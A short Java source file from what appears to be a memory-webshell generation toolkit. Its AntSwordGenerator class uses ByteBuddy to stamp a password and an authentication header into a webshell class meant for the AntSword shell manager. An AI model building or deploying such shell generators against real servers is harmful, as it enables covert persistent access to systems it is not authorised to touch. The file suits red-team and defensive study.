package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.memshell.config.AntSwordConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2025/02/18
 */
public class AntSwordGenerator extends ByteBuddyShellGenerator<AntSwordConfig> {
    public AntSwordGenerator(ShellConfig shellConfig, AntSwordConfig shellToolConfig) {
        super(shellConfig, shellToolConfig);
    }

    @Override
    protected DynamicType.Builder<?> getBuilder() {
        return new ByteBuddy()
                .redefine(shellToolConfig.getShellClass())
                .field(named("pass")).value(shellToolConfig.getPass())
                .field(named("headerName")).value(shellToolConfig.getHeaderName())
                .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
    }
}
